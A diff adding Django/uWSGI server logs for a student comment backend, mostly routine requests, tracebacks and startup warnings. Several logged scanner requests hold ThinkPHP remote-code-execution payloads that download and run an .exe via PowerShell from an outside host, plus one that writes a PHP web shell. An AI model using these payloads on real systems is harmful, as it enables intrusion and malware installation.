@@ -130,3 +130,1476 @@ Traceback (most recent call last):
 IndexError: list index out of range
 [pid: 23834|app: 0|req: 24/24] 122.238.121.81 () {44 vars in 858 bytes} [Fri May 29 11:22:37 2020] GET /selectComment => generated 59390 bytes in 26 msecs (HTTP/1.1 500) 5 headers in 156 bytes (2 switches on core 0)
 [pid: 23834|app: 0|req: 25/25] 122.238.121.81 () {42 vars in 838 bytes} [Fri May 29 11:22:39 2020] GET /selectComment/1 => generated 317 bytes in 3 msecs (HTTP/1.1 200) 4 headers in 128 bytes (2 switches on core 0)
+Internal Server Error: /like/UID
+Traceback (most recent call last):
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/fields/__init__.py", line 1772, in get_prep_value
+    return int(value)
+ValueError: invalid literal for int() with base 10: 'UID'
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/base.py", line 115, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/base.py", line 113, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "./backendApi/views.py", line 79, in like
+    count = models.Comment.objects.get(UID = uid)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/manager.py", line 82, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/query.py", line 404, in get
+    clone = self._chain() if self.query.combinator else self.filter(*args, **kwargs)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/query.py", line 904, in filter
+    return self._filter_or_exclude(False, *args, **kwargs)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/query.py", line 923, in _filter_or_exclude
+    clone.query.add_q(Q(*args, **kwargs))
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1351, in add_q
+    clause, _ = self._add_q(q_object, self.used_aliases)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1382, in _add_q
+    check_filterable=check_filterable,
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1312, in build_filter
+    condition = self.build_lookup(lookups, col, value)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1166, in build_lookup
+    lookup = lookup_class(lhs, rhs)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/lookups.py", line 22, in __init__
+    self.rhs = self.get_prep_lookup()
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/lookups.py", line 72, in get_prep_lookup
+    return self.lhs.output_field.get_prep_value(self.rhs)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/fields/__init__.py", line 1776, in get_prep_value
+    ) from e
+ValueError: Field 'UID' expected a number but got 'UID'.
+[pid: 23834|app: 0|req: 26/26] 122.238.121.81 () {42 vars in 824 bytes} [Fri May 29 11:27:03 2020] GET /like/UID => generated 116356 bytes in 40 msecs (HTTP/1.1 500) 5 headers in 157 bytes (2 switches on core 0)
+[pid: 23834|app: 0|req: 27/27] 121.35.100.183 () {40 vars in 827 bytes} [Fri May 29 11:28:48 2020] GET /addComment/Department/Grade/Identity/Name/Comment => generated 30 bytes in 1298 msecs (HTTP/1.1 200) 4 headers in 127 bytes (2 switches on core 0)
+Not Found: /robots.txt
+[pid: 23834|app: 0|req: 28/28] 121.35.100.183 () {38 vars in 593 bytes} [Fri May 29 11:28:49 2020] GET /robots.txt => generated 2595 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 23834|app: 0|req: 29/29] 121.35.100.183 () {40 vars in 717 bytes} [Fri May 29 11:28:50 2020] GET /favicon.ico => generated 2598 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
+Internal Server Error: /like/UID
+Traceback (most recent call last):
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/fields/__init__.py", line 1772, in get_prep_value
+    return int(value)
+ValueError: invalid literal for int() with base 10: 'UID'
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/base.py", line 115, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/base.py", line 113, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "./backendApi/views.py", line 79, in like
+    count = models.Comment.objects.get(UID = uid)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/manager.py", line 82, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/query.py", line 404, in get
+    clone = self._chain() if self.query.combinator else self.filter(*args, **kwargs)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/query.py", line 904, in filter
+    return self._filter_or_exclude(False, *args, **kwargs)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/query.py", line 923, in _filter_or_exclude
+    clone.query.add_q(Q(*args, **kwargs))
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1351, in add_q
+    clause, _ = self._add_q(q_object, self.used_aliases)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1382, in _add_q
+    check_filterable=check_filterable,
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1312, in build_filter
+    condition = self.build_lookup(lookups, col, value)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1166, in build_lookup
+    lookup = lookup_class(lhs, rhs)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/lookups.py", line 22, in __init__
+    self.rhs = self.get_prep_lookup()
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/lookups.py", line 72, in get_prep_lookup
+    return self.lhs.output_field.get_prep_value(self.rhs)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/fields/__init__.py", line 1776, in get_prep_value
+    ) from e
+ValueError: Field 'UID' expected a number but got 'UID'.
+[pid: 23834|app: 0|req: 30/30] 121.35.100.183 () {40 vars in 745 bytes} [Fri May 29 11:28:57 2020] GET /like/UID => generated 115807 bytes in 40 msecs (HTTP/1.1 500) 5 headers in 157 bytes (2 switches on core 0)
+[pid: 23834|app: 0|req: 31/31] 121.35.100.183 () {40 vars in 739 bytes} [Fri May 29 11:30:12 2020] GET /admin => generated 0 bytes in 0 msecs (HTTP/1.1 301) 4 headers in 145 bytes (2 switches on core 0)
+[pid: 23834|app: 0|req: 32/32] 121.35.100.183 () {40 vars in 741 bytes} [Fri May 29 11:30:12 2020] GET /admin/ => generated 0 bytes in 11 msecs (HTTP/1.1 302) 8 headers in 301 bytes (2 switches on core 0)
+[pid: 23834|app: 0|req: 33/33] 121.35.100.183 () {40 vars in 778 bytes} [Fri May 29 11:30:12 2020] GET /admin/login/?next=/admin/ => generated 1913 bytes in 22 msecs (HTTP/1.1 200) 8 headers in 431 bytes (1 switches on core 0)
+Not Found: /static/admin/css/base.css
+[pid: 23834|app: 0|req: 34/34] 121.35.100.183 () {42 vars in 789 bytes} [Fri May 29 11:30:12 2020] GET /static/admin/css/base.css => generated 2640 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
+Not Found: /static/admin/css/login.css
+[pid: 23834|app: 0|req: 35/35] 121.35.100.183 () {42 vars in 791 bytes} [Fri May 29 11:30:12 2020] GET /static/admin/css/login.css => generated 2643 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
+Not Found: /static/admin/css/responsive.css
+[pid: 23834|app: 0|req: 36/36] 121.35.100.183 () {42 vars in 801 bytes} [Fri May 29 11:30:12 2020] GET /static/admin/css/responsive.css => generated 2658 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
+[pid: 23834|app: 0|req: 37/37] 121.35.100.183 () {52 vars in 1112 bytes} [Fri May 29 11:30:16 2020] POST /admin/login/?next=/admin/ => generated 2074 bytes in 134 msecs (HTTP/1.1 200) 8 headers in 431 bytes (2 switches on core 0)
+Not Found: /static/admin/css/base.css
+[pid: 23834|app: 0|req: 38/38] 121.35.100.183 () {42 vars in 789 bytes} [Fri May 29 11:30:17 2020] GET /static/admin/css/base.css => generated 2640 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
+Not Found: /static/admin/css/login.css
+[pid: 23834|app: 0|req: 39/39] 121.35.100.183 () {42 vars in 791 bytes} [Fri May 29 11:30:17 2020] GET /static/admin/css/login.css => generated 2643 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
+Not Found: /static/admin/css/responsive.css
+[pid: 23834|app: 0|req: 40/40] 121.35.100.183 () {42 vars in 801 bytes} [Fri May 29 11:30:17 2020] GET /static/admin/css/responsive.css => generated 2658 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
+Not Found: /
+[pid: 23834|app: 0|req: 41/41] 122.238.121.81 () {42 vars in 808 bytes} [Fri May 29 11:42:23 2020] GET / => generated 2547 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
+Not Found: /
+[pid: 23834|app: 0|req: 42/42] 93.79.134.97 () {32 vars in 463 bytes} [Fri May 29 11:56:45 2020] GET / => generated 2550 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /hudson
+[pid: 23834|app: 0|req: 43/43] 162.243.144.127 () {34 vars in 407 bytes} [Fri May 29 13:34:05 2020] GET /hudson => generated 2583 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Internal Server Error: /like/UID
+Traceback (most recent call last):
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/fields/__init__.py", line 1772, in get_prep_value
+    return int(value)
+ValueError: invalid literal for int() with base 10: 'UID'
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/base.py", line 115, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/base.py", line 113, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "./backendApi/views.py", line 79, in like
+    count = models.Comment.objects.get(UID = uid)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/manager.py", line 82, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/query.py", line 404, in get
+    clone = self._chain() if self.query.combinator else self.filter(*args, **kwargs)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/query.py", line 904, in filter
+    return self._filter_or_exclude(False, *args, **kwargs)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/query.py", line 923, in _filter_or_exclude
+    clone.query.add_q(Q(*args, **kwargs))
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1351, in add_q
+    clause, _ = self._add_q(q_object, self.used_aliases)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1382, in _add_q
+    check_filterable=check_filterable,
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1312, in build_filter
+    condition = self.build_lookup(lookups, col, value)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1166, in build_lookup
+    lookup = lookup_class(lhs, rhs)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/lookups.py", line 22, in __init__
+    self.rhs = self.get_prep_lookup()
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/lookups.py", line 72, in get_prep_lookup
+    return self.lhs.output_field.get_prep_value(self.rhs)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/fields/__init__.py", line 1776, in get_prep_value
+    ) from e
+ValueError: Field 'UID' expected a number but got 'UID'.
+[pid: 23834|app: 0|req: 44/44] 223.104.63.33 () {42 vars in 833 bytes} [Fri May 29 14:31:57 2020] GET /like/UID => generated 116537 bytes in 40 msecs (HTTP/1.1 500) 5 headers in 157 bytes (2 switches on core 0)
+Not Found: /favicon.ico
+[pid: 23834|app: 0|req: 45/45] 223.104.63.33 () {42 vars in 764 bytes} [Fri May 29 14:31:58 2020] GET /favicon.ico => generated 2598 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /
+[pid: 23834|app: 0|req: 46/46] 137.135.86.214 () {32 vars in 434 bytes} [Fri May 29 16:03:04 2020] GET / => generated 2547 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /public/index.php
+[pid: 23834|app: 0|req: 47/47] 41.230.11.146 () {38 vars in 1444 bytes} [Fri May 29 17:14:09 2020] GET /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fk.0xbdairolkoie.space/download.exe','%SystemRoot%/Temp/kjdbyouqxzirtbu7383.exe');start%20%SystemRoot%/Temp/kjdbyouqxzirtbu7383.exe => generated 2952 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /public/index.php
+[pid: 23834|app: 0|req: 48/48] 41.230.11.146 () {38 vars in 1023 bytes} [Fri May 29 17:14:09 2020] GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php => generated 2813 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
+Not Found: /public/hydra.php
+[pid: 23834|app: 0|req: 49/49] 41.230.11.146 () {38 vars in 1195 bytes} [Fri May 29 17:14:09 2020] GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fk.0xbdairolkoie.space/download.exe','%SystemRoot%/Temp/kjdbyouqxzirtbu7383.exe');start%20%SystemRoot%/Temp/kjdbyouqxzirtbu7383.exe => generated 2855 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
+Not Found: /public/index.php
+[pid: 23834|app: 0|req: 50/50] 116.252.0.148 () {32 vars in 1047 bytes} [Fri May 29 17:14:09 2020] HEAD /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fk.0xbdairolkoie.space/download.exe','%SystemRoot%/Temp/kjdbyouqxzirtbu7383.exe');start%20%SystemRoot%/Temp/kjdbyouqxzirtbu7383.exe => generated 2953 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
+Not Found: /
+[pid: 23834|app: 0|req: 51/51] 162.243.144.186 () {34 vars in 395 bytes} [Fri May 29 17:48:07 2020] GET / => generated 2547 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /
+[pid: 23834|app: 0|req: 52/52] 198.108.66.249 () {34 vars in 394 bytes} [Fri May 29 17:57:27 2020] GET / => generated 2547 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /
+[pid: 23834|app: 0|req: 53/53] 171.248.33.242 () {32 vars in 465 bytes} [Fri May 29 18:09:25 2020] GET / => generated 2550 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /
+[pid: 23834|app: 0|req: 54/54] 181.175.171.111 () {32 vars in 472 bytes} [Fri May 29 18:12:57 2020] GET / => generated 2550 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /
+[pid: 23834|app: 0|req: 55/55] 79.127.33.118 () {32 vars in 463 bytes} [Fri May 29 20:13:48 2020] GET / => generated 2550 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /
+[pid: 23834|app: 0|req: 56/56] 193.118.53.202 () {34 vars in 488 bytes} [Fri May 29 20:25:01 2020] GET / => generated 2547 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /
+[pid: 23834|app: 0|req: 57/57] 177.131.58.35 () {32 vars in 463 bytes} [Sat May 30 00:11:33 2020] GET / => generated 2550 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /
+[pid: 23834|app: 0|req: 58/58] 47.100.22.23 () {34 vars in 458 bytes} [Sat May 30 01:15:47 2020] GET / => generated 2547 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /
+[pid: 23834|app: 0|req: 59/59] 198.108.66.251 () {34 vars in 394 bytes} [Sat May 30 01:23:22 2020] GET / => generated 2547 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /
+[pid: 23834|app: 0|req: 60/60] 200.196.32.100 () {32 vars in 471 bytes} [Sat May 30 03:31:37 2020] GET / => generated 2550 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
+Not Found: /
+[pid: 23834|app: 0|req: 61/61] 159.224.64.185 () {32 vars in 464 bytes} [Sat May 30 05:31:35 2020] GET / => generated 2550 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /
+[pid: 23834|app: 0|req: 62/62] 101.251.242.238 () {38 vars in 597 bytes} [Sat May 30 05:38:55 2020] GET / => generated 2550 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /
+[pid: 23834|app: 0|req: 63/63] 96.126.103.73 () {34 vars in 482 bytes} [Sat May 30 07:29:02 2020] GET / => generated 2547 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /
+[pid: 23834|app: 0|req: 64/64] 185.189.102.153 () {32 vars in 465 bytes} [Sat May 30 08:10:02 2020] GET / => generated 2550 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /portal/redlion
+[pid: 23834|app: 0|req: 65/65] 162.243.137.244 () {34 vars in 423 bytes} [Sat May 30 08:13:49 2020] GET /portal/redlion => generated 2607 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /
+[pid: 23834|app: 0|req: 66/66] 139.162.119.197 () {32 vars in 401 bytes} [Sat May 30 08:31:34 2020] GET / => generated 2547 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /
+[pid: 23834|app: 0|req: 67/67] 110.74.198.37 () {32 vars in 470 bytes} [Sat May 30 10:33:44 2020] GET / => generated 2550 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /
+[pid: 23834|app: 0|req: 68/68] 51.254.59.113 () {32 vars in 450 bytes} [Sat May 30 12:40:57 2020] GET / => generated 2547 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /
+[pid: 23834|app: 0|req: 69/69] 24.5.136.93 () {28 vars in 305 bytes} [Sat May 30 13:30:48 2020] GET / => generated 2547 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+[pid: 23834|app: 0|req: 70/70] 122.238.121.81 () {42 vars in 972 bytes} [Sat May 30 14:00:49 2020] GET /addComment/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB/17%E7%BA%A7/7%E7%8F%AD/%E5%BC%A0%E4%B8%89/%E7%A5%9D%E7%A6%8F/123 => generated 30 bytes in 2573 msecs (HTTP/1.1 200) 4 headers in 127 bytes (2 switches on core 0)
+Not Found: /favicon.ico
+[pid: 23834|app: 0|req: 71/71] 122.238.121.81 () {42 vars in 859 bytes} [Sat May 30 14:00:51 2020] GET /favicon.ico => generated 2598 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
+[pid: 23834|app: 0|req: 72/72] 122.238.121.81 () {42 vars in 923 bytes} [Sat May 30 14:01:14 2020] GET /addComment//17%E7%BA%A7/7%E7%8F%AD/%E5%BC%A0%E4%B8%89/%E7%A5%9D%E7%A6%8F/123 => generated 30 bytes in 1468 msecs (HTTP/1.1 200) 4 headers in 127 bytes (2 switches on core 0)
+Not Found: /
+[pid: 23834|app: 0|req: 73/73] 223.71.167.163 () {34 vars in 458 bytes} [Sat May 30 14:01:26 2020] GET / => generated 2550 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Sat May 30 14:03:34 2020 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+*** Starting uWSGI 2.0.18 (64bit) on [Sat May 30 22:03:45 2020] ***
+compiled with version: 7.3.0 on 22 July 2019 16:51:41
+os: Linux-4.15.0-48-generic #51-Ubuntu SMP Wed Apr 3 08:28:49 UTC 2019
+nodename: Quasrain
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/HIT-100th-Anniversary-Celebration/backend
+detected binary path: /root/miniconda3/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to .
+your processes number limit is 7798
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address ./backend.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.3 | packaged by conda-forge | (default, Jul  1 2019, 21:52:21)  [GCC 7.3.0]
+Python main interpreter initialized at 0x5611f74cfcb0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x5611f74cfcb0 pid: 26823 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 26823)
+spawned uWSGI worker 1 (pid: 26824, cores: 1)
+Internal Server Error: /addComment/17级/7班/张三/祝福/123
+Traceback (most recent call last):
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/base.py", line 115, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/base.py", line 113, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "./backendApi/views.py", line 31, in addComment
+    comment.phone = tmp[7]
+IndexError: list index out of range
+[pid: 26824|app: 0|req: 1/1] 122.238.121.81 () {44 vars in 954 bytes} [Sat May 30 14:03:47 2020] GET /addComment//17%E7%BA%A7/7%E7%8F%AD/%E5%BC%A0%E4%B8%89/%E7%A5%9D%E7%A6%8F/123 => generated 60098 bytes in 172 msecs (HTTP/1.1 500) 5 headers in 156 bytes (2 switches on core 0)
+Internal Server Error: /addComment/计算机系/17级/7班/张三/祝福/123
+Traceback (most recent call last):
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/backends/utils.py", line 86, in _execute
+    return self.cursor.execute(sql, params)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/backends/mysql/base.py", line 74, in execute
+    return self.cursor.execute(query, args)
+  File "/root/miniconda3/lib/python3.7/site-packages/pymysql/cursors.py", line 170, in execute
+    result = self._query(query)
+  File "/root/miniconda3/lib/python3.7/site-packages/pymysql/cursors.py", line 328, in _query
+    conn.query(q)
+  File "/root/miniconda3/lib/python3.7/site-packages/pymysql/connections.py", line 517, in query
+    self._affected_rows = self._read_query_result(unbuffered=unbuffered)
+  File "/root/miniconda3/lib/python3.7/site-packages/pymysql/connections.py", line 732, in _read_query_result
+    result.read()
+  File "/root/miniconda3/lib/python3.7/site-packages/pymysql/connections.py", line 1075, in read
+    first_packet = self.connection._read_packet()
+  File "/root/miniconda3/lib/python3.7/site-packages/pymysql/connections.py", line 684, in _read_packet
+    packet.check_error()
+  File "/root/miniconda3/lib/python3.7/site-packages/pymysql/protocol.py", line 220, in check_error
+    err.raise_mysql_exception(self._data)
+  File "/root/miniconda3/lib/python3.7/site-packages/pymysql/err.py", line 109, in raise_mysql_exception
+    raise errorclass(errno, errval)
+pymysql.err.InternalError: (1366, "Incorrect string value: '\\xE8\\xAE\\xA1\\xE7\\xAE\\x97...' for column 'Department' at row 1")
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/base.py", line 115, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/base.py", line 113, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "./backendApi/views.py", line 38, in addComment
+    comment.save()
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/base.py", line 746, in save
+    force_update=force_update, update_fields=update_fields)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/base.py", line 784, in save_base
+    force_update, using, update_fields,
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/base.py", line 887, in _save_table
+    results = self._do_insert(cls._base_manager, using, fields, returning_fields, raw)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/base.py", line 926, in _do_insert
+    using=using, raw=raw,
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/manager.py", line 82, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/query.py", line 1204, in _insert
+    return query.get_compiler(using=using).execute_sql(returning_fields)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/sql/compiler.py", line 1391, in execute_sql
+    cursor.execute(sql, params)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/backends/utils.py", line 100, in execute
+    return super().execute(sql, params)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/backends/utils.py", line 68, in execute
+    return self._execute_with_wrappers(sql, params, many=False, executor=self._execute)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/backends/utils.py", line 77, in _execute_with_wrappers
+    return executor(sql, params, many, context)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/backends/utils.py", line 86, in _execute
+    return self.cursor.execute(sql, params)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/utils.py", line 90, in __exit__
+    raise dj_exc_value.with_traceback(traceback) from exc_value
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/backends/utils.py", line 86, in _execute
+    return self.cursor.execute(sql, params)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/backends/mysql/base.py", line 74, in execute
+    return self.cursor.execute(query, args)
+  File "/root/miniconda3/lib/python3.7/site-packages/pymysql/cursors.py", line 170, in execute
+    result = self._query(query)
+  File "/root/miniconda3/lib/python3.7/site-packages/pymysql/cursors.py", line 328, in _query
+    conn.query(q)
+  File "/root/miniconda3/lib/python3.7/site-packages/pymysql/connections.py", line 517, in query
+    self._affected_rows = self._read_query_result(unbuffered=unbuffered)
+  File "/root/miniconda3/lib/python3.7/site-packages/pymysql/connections.py", line 732, in _read_query_result
+    result.read()
+  File "/root/miniconda3/lib/python3.7/site-packages/pymysql/connections.py", line 1075, in read
+    first_packet = self.connection._read_packet()
+  File "/root/miniconda3/lib/python3.7/site-packages/pymysql/connections.py", line 684, in _read_packet
+    packet.check_error()
+  File "/root/miniconda3/lib/python3.7/site-packages/pymysql/protocol.py", line 220, in check_error
+    err.raise_mysql_exception(self._data)
+  File "/root/miniconda3/lib/python3.7/site-packages/pymysql/err.py", line 109, in raise_mysql_exception
+    raise errorclass(errno, errval)
+django.db.utils.InternalError: (1366, "Incorrect string value: '\\xE8\\xAE\\xA1\\xE7\\xAE\\x97...' for column 'Department' at row 1")
